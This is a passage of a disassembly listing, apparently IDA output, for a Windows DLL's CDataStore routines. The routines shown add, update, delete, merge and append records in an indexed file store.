		push	dword ptr [ebx+0Ch] ; int
		lea	esi, [edi+8]
		push	dword ptr [ebx+8] ; lDistanceToMove
		mov	ecx, esi
		call	Ordinal789
		test	eax, eax
		jz	short loc_6AF418BA
		and	[ebp+var_C], 0
		and	[ebp+var_8], 0
		push	0Ah
		pop	ecx
		lea	esi, [ebp+var_5C]
		mov	edi, ebx
		rep movsd
		mov	eax, [ebx+8]
		or	eax, [ebx+0Ch]
		jz	short loc_6AF418CB
		mov	ecx, [ebp+var_4]
		lea	eax, [ebp+var_5C]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		push	ebx		; int
		call	Ordinal619
		test	eax, eax
		jnz	short loc_6AF418CB

loc_6AF4187C:				; CODE XREF: Ordinal616+1ABj
		push	offset aCdatastoreMe_0 ; "CDataStore::MergeEx()	: ReadPreviousInd"...
		jmp	short loc_6AF418DE
; ---------------------------------------------------------------------------

loc_6AF41883:				; CODE XREF: Ordinal616+265j
		push	ebx
		mov	ecx, edi
		mov	[ebx+18h], eax
		call	Ordinal612
		test	eax, eax
		jnz	short loc_6AF41899

loc_6AF41892:				; CODE XREF: Ordinal616+B2j
					; Ordinal616+F1j ...
		push	offset aCdatastoreMe_1 ; "CDataStore::MergeEx()	: WriteIndex() =="...
		jmp	short loc_6AF418DE
; ---------------------------------------------------------------------------

loc_6AF41899:				; CODE XREF: Ordinal616+2BEj
		mov	eax, [ebx+18h]
		xor	ecx, ecx
		add	eax, [ebx+8]
		lea	esi, [edi+8]
		adc	ecx, [ebx+0Ch]
		add	eax, 28h
		adc	ecx, 0
		push	ecx		; int
		push	eax		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal789
		test	eax, eax
		jnz	short loc_6AF418CB

loc_6AF418BA:				; CODE XREF: Ordinal616+279j
		mov	ecx, esi
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreMe_2 ; "CDataStore::MergeEx()	: m_File.SetLengt"...
		jmp	short loc_6AF418DE
; ---------------------------------------------------------------------------

loc_6AF418CB:				; CODE XREF: Ordinal616+293j
					; Ordinal616+2A8j ...
		mov	eax, [ebp+arg_4]
		mov	dword ptr [eax], 1

loc_6AF418D4:				; CODE XREF: Ordinal616+24Fj
					; Ordinal616+25Dj
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF418E6
; ---------------------------------------------------------------------------

loc_6AF418D9:				; CODE XREF: Ordinal616+51j
					; Ordinal616+6Cj ...
		push	offset aCdatastoreMe_3 ; "CDataStore::MergeEx()	: ReadNextIndex()"...

loc_6AF418DE:				; CODE XREF: Ordinal616+2AFj
					; Ordinal616+2C5j ...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF418E6:				; CODE XREF: Ordinal616+305j
		pop	edi
		pop	esi

loc_6AF418E8:				; CODE XREF: Ordinal616+1Dj
		pop	ebx
		leave
		retn	8
Ordinal616	endp

; Exported entry 620.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal620
Ordinal620	proc near		; CODE XREF: Ordinal590+6Ep
					; Ordinal610+1Ep
					; DATA XREF: ...

Dst		= byte ptr -30h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lpBuffer	= dword	ptr  8
nNumberOfBytesToWrite= dword ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		mov	eax, [ebp+arg_C]
		push	ebx
		push	esi
		xor	esi, esi
		mov	ebx, ecx
		mov	[eax], esi
		mov	[eax+4], esi
		cmp	[ebx+28h], esi
		jnz	short loc_6AF41926
		lea	eax, [ebp+Dst]
		push	eax		; Dst
		push	esi		; int
		call	Ordinal622
		test	eax, eax
		jnz	short loc_6AF41926
		push	offset aCdatastoreAp_1 ; "CDataStore::AppendData() : FindAddIndex"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF41A2A
; ---------------------------------------------------------------------------

loc_6AF41926:				; CODE XREF: Ordinal620+17j
					; Ordinal620+25j
		push	edi		; Args
		lea	eax, [ebp+var_8]
		lea	edi, [ebx+8]
		push	eax
		mov	ecx, edi
		mov	[ebp+var_8], esi
		mov	[ebp+var_4], esi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF41950
		mov	ecx, edi
		call	Ordinal236
		push	offset aCdatastoreAp_2 ; "CDataStore::AppendData() : m_File.GetLe"...
		jmp	loc_6AF41A1E
; ---------------------------------------------------------------------------

loc_6AF41950:				; CODE XREF: Ordinal620+50j
		push	28h		; Size
		lea	eax, [ebp+Dst]
		push	esi		; Val
		push	eax		; Dst
		call	memset
		mov	eax, [ebp+var_8]
		mov	edi, [ebp+nNumberOfBytesToWrite]
		mov	[ebp+var_28], eax
		mov	eax, [ebp+var_4]
		mov	[ebp+var_24], eax
		mov	eax, [ebx+60h]
		mov	[ebp+var_20], eax
		mov	eax, [ebx+64h]
		add	esp, 0Ch
		cmp	[ebx+1Ch], esi
		mov	[ebp+var_18], edi
		mov	[ebp+var_1C], eax
		jz	short loc_6AF41992
		push	edi
		push	[ebp+lpBuffer]
		call	Ordinal581
		pop	ecx
		pop	ecx
		mov	[ebp+var_10], eax
		jmp	short loc_6AF41995
; ---------------------------------------------------------------------------

loc_6AF41992:				; CODE XREF: Ordinal620+93j
		mov	[ebp+var_10], esi

loc_6AF41995:				; CODE XREF: Ordinal620+A3j
		lea	eax, [ebp+Dst]
		push	eax
		mov	ecx, ebx
		mov	[ebp+var_14], edi
		call	Ordinal612
		test	eax, eax
		jz	short loc_6AF41A11
		mov	eax, [ebp+var_28]
		mov	ecx, [ebp+var_24]
		push	edi		; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		add	eax, 28h
		adc	ecx, esi
		push	ecx		; int
		push	eax		; lDistanceToMove
		lea	ecx, [ebx+8]
		call	Ordinal781
		test	eax, eax
		jz	short loc_6AF41A11
		cmp	[ebp+arg_8], 0
		push	0Ah
		lea	edi, [ebx+58h]
		pop	ecx
		lea	esi, [ebp+Dst]
		rep movsd
		jz	short loc_6AF419FE
		cmp	dword ptr [ebx+18h], 0
		jz	short loc_6AF419FE
		lea	esi, [ebx+8]
		mov	ecx, esi
		call	Ordinal785
		test	eax, eax
		jnz	short loc_6AF419FE
		mov	ecx, esi
		call	Ordinal236
		push	offset aCdatastoreAp_3 ; "CDataStore::AppendData() : m_File.Flush"...
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF419FE:				; CODE XREF: Ordinal620+E6j
					; Ordinal620+ECj ...
		mov	eax, [ebp+arg_C]
		mov	ecx, [ebp+var_28]
		mov	[eax], ecx
		mov	ecx, [ebp+var_24]
		mov	[eax+4], ecx
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF41A29
; ---------------------------------------------------------------------------

loc_6AF41A11:				; CODE XREF: Ordinal620+B8j
					; Ordinal620+D5j
		lea	ecx, [ebx+8]
		call	Ordinal236
		push	offset aCdatastoreAp_4 ; "CDataStore::AppendData() : WriteIndex()"...

loc_6AF41A1E:				; CODE XREF: Ordinal620+5Ej
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF41A29:				; CODE XREF: Ordinal620+122j
		pop	edi

loc_6AF41A2A:				; CODE XREF: Ordinal620+34j
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal620	endp

; Exported entry 585.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal585
Ordinal585	proc near		; CODE XREF: Ordinal426+11j
					; Ordinal597+71p ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5AA78
		call	Ordinal588
		lea	ecx, [esi+84h]
		call	Ordinal1279
		lea	ecx, [esi+8]
		pop	esi
		jmp	Ordinal770
Ordinal585	endp

; Exported entry 586.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal586(LPCSTR Args,	int, int)
		public Ordinal586
Ordinal586	proc near		; CODE XREF: Ordinal597+4Bp
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	[esp+arg_8]	; int
		mov	eax, [esp+4+arg_4]
		push	0		; hTemplateFile
		neg	eax
		push	80h		; dwFlagsAndAttributes
		sbb	eax, eax
		add	eax, 3
		push	eax		; nNumberOfBytesToWrite
		push	0		; lpSecurityAttributes
		push	1		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[esp+1Ch+Args]	; Args
		call	Ordinal587
		retn	0Ch
Ordinal586	endp

; Exported entry 590.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=6Ch

; int __stdcall	Ordinal590(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, int)
		public Ordinal590
Ordinal590	proc near		; CODE XREF: Ordinal591+90p
					; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -8Ch
var_84		= dword	ptr -84h
var_80		= dword	ptr -80h
var_7C		= dword	ptr -7Ch
var_78		= dword	ptr -78h
var_64		= byte ptr -64h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_3C		= byte ptr -3Ch
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
Dst		= dword	ptr -28h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
lpBuffer	= dword	ptr  8
nNumberOfBytesToWrite= dword ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		lea	ebp, [esp-6Ch]
		sub	esp, 8Ch
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [ebx+84h]
		push	eax
		lea	ecx, [ebp+6Ch+var_3C]
		call	Ordinal1228
		mov	esi, [ebp+6Ch+arg_8]
		mov	[esi], edi
		mov	[esi+4], edi
		mov	edi, [ebp+6Ch+nNumberOfBytesToWrite]
		test	edi, edi
		jz	loc_6AF41C46
		cmp	[ebp+6Ch+lpBuffer], 0
		jz	loc_6AF41C46
		lea	eax, [ebp+6Ch+Dst]
		push	eax		; Dst
		push	edi		; int
		mov	ecx, ebx
		call	Ordinal622
		test	eax, eax
		jnz	short loc_6AF41AD9
		push	offset aCdatastoreAddF ; "CDataStore::Add() : FindAddIndex() ==	F"...
		jmp	loc_6AF41C4B
; ---------------------------------------------------------------------------

loc_6AF41AD9:				; CODE XREF: Ordinal590+4Fj
		mov	eax, [ebp+6Ch+var_20]
		or	eax, [ebp+6Ch+var_1C]
		jnz	short loc_6AF41B03
		push	esi
		xor	esi, esi
		inc	esi
		push	esi
		push	edi
		push	[ebp+6Ch+lpBuffer]
		mov	ecx, ebx
		call	Ordinal620
		test	eax, eax
		jnz	loc_6AF41C53
		push	offset aCdatastoreAddA ; "CDataStore::Add() : AppendData() == FAL"...
		jmp	loc_6AF41C4B
; ---------------------------------------------------------------------------

loc_6AF41B03:				; CODE XREF: Ordinal590+61j
		xor	esi, esi
		cmp	[ebp+6Ch+var_C], esi
		jbe	loc_6AF41BAF
		lea	eax, [ebp+6Ch+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+6Ch+var_30]
		push	eax		; int
		lea	eax, [ebp+6Ch+Dst]
		push	eax		; int
		mov	ecx, ebx
		mov	[ebp+6Ch+var_30], esi
		mov	[ebp+6Ch+var_2C], esi
		call	Ordinal618
		test	eax, eax
		jnz	short loc_6AF41B3A
		push	offset aCdatastoreAddR ; "CDataStore::Add() : ReadNextIndex() == "...
		call	sub_6AF3102E
		jmp	loc_6AF41C52
; ---------------------------------------------------------------------------

loc_6AF41B3A:				; CODE XREF: Ordinal590+ABj
		mov	eax, [ebp+6Ch+var_C]
		push	0Ah
		pop	ecx
		lea	esi, [ebp+6Ch+Dst]
		lea	edi, [ebp+6Ch+var_64]
		rep movsd
		mov	[ebp+6Ch+var_10], eax
		lea	eax, [ebp+6Ch+Dst]
		push	eax
		mov	ecx, ebx
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41C3F
		mov	edx, [ebp+6Ch+var_5C]
		mov	eax, [ebp+6Ch+var_48]
		mov	esi, [ebp+6Ch+var_58]
		mov	edi, [ebp+6Ch+var_4C]
		xor	ecx, ecx
		add	eax, edx
		adc	ecx, esi
		add	eax, 28h
		adc	ecx, 0
		sub	edi, [ebp+6Ch+var_48]
		mov	[ebp+6Ch+var_18], edx
		mov	edx, [ebp+6Ch+var_84]
		sub	edi, 28h
		or	edx, [ebp+6Ch+var_80]
		mov	[ebp+6Ch+var_20], eax
		mov	[ebp+6Ch+var_1C], ecx
		mov	[ebp+6Ch+var_10], edi
		mov	[ebp+6Ch+var_14], esi
		jz	short loc_6AF41BAC
		mov	[ebp+6Ch+var_7C], eax
		lea	eax, [ebp+6Ch+Buffer]
		mov	[ebp+6Ch+var_78], ecx
		push	eax
		mov	ecx, ebx
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF41C3F

loc_6AF41BAC:				; CODE XREF: Ordinal590+113j
		mov	edi, [ebp+6Ch+nNumberOfBytesToWrite]

loc_6AF41BAF:				; CODE XREF: Ordinal590+8Aj
		cmp	dword ptr [ebx+1Ch], 0
		jz	short loc_6AF41BC5
		push	edi
		push	[ebp+6Ch+lpBuffer]
		call	Ordinal581
		pop	ecx
		pop	ecx
		mov	[ebp+6Ch+var_8], eax
		jmp	short loc_6AF41BC9
; ---------------------------------------------------------------------------

loc_6AF41BC5:				; CODE XREF: Ordinal590+135j
		and	[ebp+6Ch+var_8], 0

loc_6AF41BC9:				; CODE XREF: Ordinal590+145j
		lea	eax, [ebp+6Ch+Dst]
		push	eax
		mov	ecx, ebx
		mov	[ebp+6Ch+var_C], edi
		call	Ordinal612
		test	eax, eax
		jz	short loc_6AF41C34
		mov	eax, [ebp+6Ch+var_20]
		mov	ecx, [ebp+6Ch+var_1C]
		push	edi		; nNumberOfBytesToWrite
		push	[ebp+6Ch+lpBuffer] ; lpBuffer
		add	eax, 28h
		adc	ecx, 0
		push	ecx		; int
		lea	esi, [ebx+8]
		push	eax		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal781
		test	eax, eax
		jz	short loc_6AF41C34
		cmp	dword ptr [ebx+18h], 0
		jz	short loc_6AF41C21
		mov	ecx, esi
		call	Ordinal785
		test	eax, eax
		jnz	short loc_6AF41C21
		mov	ecx, esi
		call	Ordinal236
		push	offset aCdatastoreAddM ; "CDataStore::Add() : m_File.Flush() ==	F"...
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF41C21:				; CODE XREF: Ordinal590+181j
					; Ordinal590+18Cj
		mov	ecx, [ebp+6Ch+var_20]
		mov	eax, [ebp+6Ch+arg_8]
		mov	[eax], ecx
		mov	ecx, [ebp+6Ch+var_1C]
		xor	esi, esi
		mov	[eax+4], ecx
		inc	esi
		jmp	short loc_6AF41C53
; ---------------------------------------------------------------------------

loc_6AF41C34:				; CODE XREF: Ordinal590+15Bj
					; Ordinal590+17Bj
		lea	ecx, [ebx+8]
		call	Ordinal236
		mov	[ebx+14h], eax

loc_6AF41C3F:				; CODE XREF: Ordinal590+DAj
					; Ordinal590+128j
		push	offset aCdatastoreAddW ; "CDataStore::Add() : WriteIndex() == FAL"...
		jmp	short loc_6AF41C4B
; ---------------------------------------------------------------------------

loc_6AF41C46:				; CODE XREF: Ordinal590+31j
					; Ordinal590+3Bj
		push	offset aCdatastoreAddD ; "CDataStore::Add() : dwSize ==	0\n"

loc_6AF41C4B:				; CODE XREF: Ordinal590+56j
					; Ordinal590+80j ...
		call	sub_6AF3102E
		xor	esi, esi

loc_6AF41C52:				; CODE XREF: Ordinal590+B7j
		pop	ecx

loc_6AF41C53:				; CODE XREF: Ordinal590+75j
					; Ordinal590+1B4j
		lea	ecx, [ebp+6Ch+var_3C]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		add	ebp, 6Ch
		leave
		retn	0Ch
Ordinal590	endp

; Exported entry 597.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=74h

; int __stdcall	Ordinal597(LPCSTR Args)
		public Ordinal597
Ordinal597	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C4		= byte ptr -0C4h
var_C		= byte ptr -0Ch
Args		= dword	ptr  8

		push	ebp
		lea	ebp, [esp-74h]
		sub	esp, 0C4h
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+74h+var_C]
		call	Ordinal1228
		push	dword ptr [esi+0B0h]
		lea	ecx, [ebp+74h+var_C4]
		push	dword ptr [esi+0ACh]
		push	dword ptr [esi+0A8h]
		push	dword ptr [esi+0A4h]
		call	Ordinal584
		push	edi		; int
		push	edi		; int
		push	[ebp+74h+Args]	; Args
		lea	ecx, [ebp+74h+var_C4]
		call	Ordinal586
		test	eax, eax
		jnz	short loc_6AF41CC8
		push	offset aCdatastoreAp_5 ; "CDataStore::AppendDataStore()	: appendS"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF41CD5
; ---------------------------------------------------------------------------

loc_6AF41CC8:				; CODE XREF: Ordinal597+52j
		lea	eax, [ebp+74h+var_C4]
		push	eax
		mov	ecx, esi
		call	Ordinal598
		mov	edi, eax

loc_6AF41CD5:				; CODE XREF: Ordinal597+5Fj
		lea	ecx, [ebp+74h+var_C4]
		call	Ordinal585
		lea	ecx, [ebp+74h+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		add	ebp, 74h
		leave
		retn	4
Ordinal597	endp

; Exported entry 610.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal610
Ordinal610	proc near		; DATA XREF: .rdata:6AF587B0o
					; .rdata:6AF5AA80o ...

var_8		= byte ptr -8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, ecx
		mov	ecx, [esi+80h]
		test	ecx, ecx
		jz	short loc_6AF41D34
		lea	eax, [ebp+var_8]
		push	eax
		push	0
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		call	Ordinal620
		test	eax, eax
		jnz	short loc_6AF41D34
		mov	ecx, [esi+80h]
		call	Ordinal608
		push	offset aCdatastoreVa_7 ; "CDataStore::ValidateData() : m_AppendIn"...
		mov	[esi+14h], eax
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF41D37
; ---------------------------------------------------------------------------

loc_6AF41D34:				; CODE XREF: Ordinal610+10j
					; Ordinal610+25j
		xor	eax, eax
		inc	eax

loc_6AF41D37:				; CODE XREF: Ordinal610+42j
		pop	esi
		leave
		retn	0Ch
Ordinal610	endp

; Exported entry 615.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal615
Ordinal615	proc near		; CODE XREF: Ordinal594+8Ep
					; Ordinal591+115p
					; DATA XREF: ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	esi
		push	edi
		xor	edi, edi
		mov	esi, ecx
		inc	edi
		jmp	short loc_6AF41D53
; ---------------------------------------------------------------------------

loc_6AF41D4D:				; CODE XREF: Ordinal615+27j
		cmp	[ebp+var_4], 0
		jz	short loc_6AF41D72

loc_6AF41D53:				; CODE XREF: Ordinal615+Fj
		lea	eax, [ebp+var_4]
		push	eax
		push	[ebp+arg_0]
		mov	ecx, esi
		call	Ordinal616
		test	eax, eax
		jnz	short loc_6AF41D4D
		push	offset aCdatastoreMe_4 ; "CDataStore::Merge() :	MergeEx() == FALS"...
		call	sub_6AF3102E
		pop	ecx
		xor	edi, edi

loc_6AF41D72:				; CODE XREF: Ordinal615+15j
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal615	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF41D7A(void *, char)
sub_6AF41D7A	proc near		; DATA XREF: .rdata:off_6AF5AA78o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal585
		test	[esp+4+arg_0], 1
		jz	short loc_6AF41D90
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF41D90:				; CODE XREF: sub_6AF41D7A+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF41D7A	endp

; Exported entry 594.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal594(LONG	lDistanceToMove, int)
		public Ordinal594
Ordinal594	proc near		; CODE XREF: Ordinal591+9Fp
					; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -3Ch
var_20		= dword	ptr -20h
var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	eax, [ebp+lDistanceToMove]
		or	eax, [ebp+arg_4]
		jnz	short loc_6AF41DCC
		push	offset aCdatastoreDele ; "CDataStore::Delete() : uIndex	= 0\n"

loc_6AF41DC1:				; CODE XREF: Ordinal594+5Aj
					; Ordinal594+66j ...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF41E5F
; ---------------------------------------------------------------------------

loc_6AF41DCC:				; CODE XREF: Ordinal594+24j
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	[ebp+arg_4]	; int
		mov	ecx, esi
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		mov	[ebp+var_8], edi
		mov	[ebp+var_4], edi
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF41DF2
		push	offset aCdatastoreDe_0 ; "CDataStore::Delete() : ReadIndex() ==	F"...
		jmp	short loc_6AF41DC1
; ---------------------------------------------------------------------------

loc_6AF41DF2:				; CODE XREF: Ordinal594+53j
		cmp	[ebp+var_20], edi
		jnz	short loc_6AF41DFE
		push	offset aCdatastoreDe_1 ; "CDataStore::Delete() : Info.m_dwDataSiz"...
		jmp	short loc_6AF41DC1
; ---------------------------------------------------------------------------

loc_6AF41DFE:				; CODE XREF: Ordinal594+5Fj
		mov	ecx, esi
		call	Ordinal621
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_20], edi
		call	Ordinal612
		test	eax, eax
		jnz	short loc_6AF41E1E
		push	offset aCdatastoreDe_2 ; "CDataStore::Delete() : WriteIndex() == "...
		jmp	short loc_6AF41DC1
; ---------------------------------------------------------------------------

loc_6AF41E1E:				; CODE XREF: Ordinal594+7Fj
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, esi
		call	Ordinal615
		test	eax, eax
		jnz	short loc_6AF41E34
		push	offset aCdatastoreDe_3 ; "CDataStore::Delete() : Merge() == FALSE"...
		jmp	short loc_6AF41DC1
; ---------------------------------------------------------------------------

loc_6AF41E34:				; CODE XREF: Ordinal594+95j
		cmp	[esi+18h], edi
		jz	short loc_6AF41E5C
		lea	edi, [esi+8]
		mov	ecx, edi
		call	Ordinal785
		test	eax, eax
		jnz	short loc_6AF41E5C
		mov	ecx, edi
		call	Ordinal236
		push	offset aCdatastoreDe_4 ; "CDataStore::Delete() : m_File.Flush()	="...
		mov	[esi+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF41E5C:				; CODE XREF: Ordinal594+A1j
					; Ordinal594+AFj
		xor	edi, edi
		inc	edi

loc_6AF41E5F:				; CODE XREF: Ordinal594+31j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn	8
Ordinal594	endp

; Exported entry 591.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal591(int,	LPCVOID	lpBuffer, DWORD	nNumberOfBytesToWrite)
		public Ordinal591
Ordinal591	proc near		; DATA XREF: .rdata:off_6AF66098o

Buffer		= byte ptr -44h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_1C		= byte ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_1C]
		call	Ordinal1228
		cmp	[ebp+nNumberOfBytesToWrite], ebx
		jz	loc_6AF41FD8
		cmp	[ebp+lpBuffer],	ebx
		jz	loc_6AF41FD8
		mov	edi, [ebp+arg_0]
		mov	eax, [edi]
		mov	ecx, [edi+4]
		mov	edx, eax
		or	edx, ecx
		jz	loc_6AF41FD8
		lea	edx, [ebp+Buffer]
		push	edx		; lpBuffer
		lea	edx, [ebp+var_8]
		push	edx		; int
		push	ecx		; int
		push	eax		; lDistanceToMove
		mov	ecx, esi
		mov	[ebp+var_8], ebx
		mov	[ebp+var_4], ebx
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF41ED7
		push	offset aCdatastoreUpda ; "CDataStore::Update() : ReadIndex() ==	F"...
		jmp	loc_6AF41FDD
; ---------------------------------------------------------------------------

loc_6AF41ED7:				; CODE XREF: Ordinal591+5Cj
		cmp	[ebp+var_28], ebx
		jnz	short loc_6AF41EE6
		push	offset aCdatastoreUp_0 ; "CDataStore::Update() : Info.m_dwDataSiz"...
		jmp	loc_6AF41FDD
; ---------------------------------------------------------------------------

loc_6AF41EE6:				; CODE XREF: Ordinal591+6Bj
		mov	eax, [ebp+nNumberOfBytesToWrite]
		cmp	[ebp+var_2C], eax
		mov	ecx, esi
		jnb	short loc_6AF41F29
		mov	eax, [edi+4]
		mov	ebx, [edi]
		push	edi		; int
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		mov	[ebp+var_C], eax
		push	[ebp+lpBuffer]	; lpBuffer
		call	Ordinal590
		test	eax, eax
		jz	short loc_6AF41F1F
		push	[ebp+var_C]	; int
		mov	ecx, esi
		push	ebx		; lDistanceToMove
		call	Ordinal594
		test	eax, eax
		jz	short loc_6AF41F1F

loc_6AF41F17:				; CODE XREF: Ordinal591+128j
					; Ordinal591+137j ...
		xor	esi, esi
		inc	esi
		jmp	loc_6AF41FE5
; ---------------------------------------------------------------------------

loc_6AF41F1F:				; CODE XREF: Ordinal591+97j
					; Ordinal591+A6j
		push	offset aCdatastoreUp_1 ; "CDataStore::Update() : Add() == FALSE\n"
		jmp	loc_6AF41FDD
; ---------------------------------------------------------------------------

loc_6AF41F29:				; CODE XREF: Ordinal591+7Fj
		call	Ordinal621
		cmp	[esi+1Ch], ebx
		jz	short loc_6AF41F45
		push	[ebp+nNumberOfBytesToWrite]
		push	[ebp+lpBuffer]
		call	Ordinal581
		pop	ecx
		pop	ecx
		mov	[ebp+var_24], eax
		jmp	short loc_6AF41F48
; ---------------------------------------------------------------------------

loc_6AF41F45:				; CODE XREF: Ordinal591+C2j
		mov	[ebp+var_24], ebx

loc_6AF41F48:				; CODE XREF: Ordinal591+D4j
		mov	eax, [ebp+nNumberOfBytesToWrite]
		mov	[ebp+var_28], eax
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, esi
		call	Ordinal612
		test	eax, eax
		jz	short loc_6AF41FC6
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		mov	eax, [ebp+var_3C]
		push	[ebp+lpBuffer]	; lpBuffer
		mov	ecx, [ebp+var_38]
		add	eax, 28h
		adc	ecx, ebx
		push	ecx		; int
		lea	edi, [esi+8]
		push	eax		; lDistanceToMove
		mov	ecx, edi
		call	Ordinal781
		test	eax, eax
		jz	short loc_6AF41FC6
		lea	eax, [ebp+Buffer]
		push	eax
		mov	ecx, esi
		call	Ordinal615
		test	eax, eax
		jnz	short loc_6AF41F94
		push	offset aCdatastoreUp_2 ; "CDataStore::Update() : Merge() == FALSE"...
		jmp	short loc_6AF41FDD
; ---------------------------------------------------------------------------

loc_6AF41F94:				; CODE XREF: Ordinal591+11Cj
		cmp	[esi+18h], ebx
		jz	loc_6AF41F17
		mov	ecx, edi
		call	Ordinal785
		test	eax, eax
		jnz	loc_6AF41F17
		mov	ecx, edi
		call	Ordinal236
		push	offset aCdatastoreUp_3 ; "CDataStore::Update() : m_File.Flush()	="...
		mov	[esi+14h], eax
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF41F17
; ---------------------------------------------------------------------------

loc_6AF41FC6:				; CODE XREF: Ordinal591+ECj
					; Ordinal591+10Dj
		lea	ecx, [esi+8]
		call	Ordinal236
		mov	[esi+14h], eax
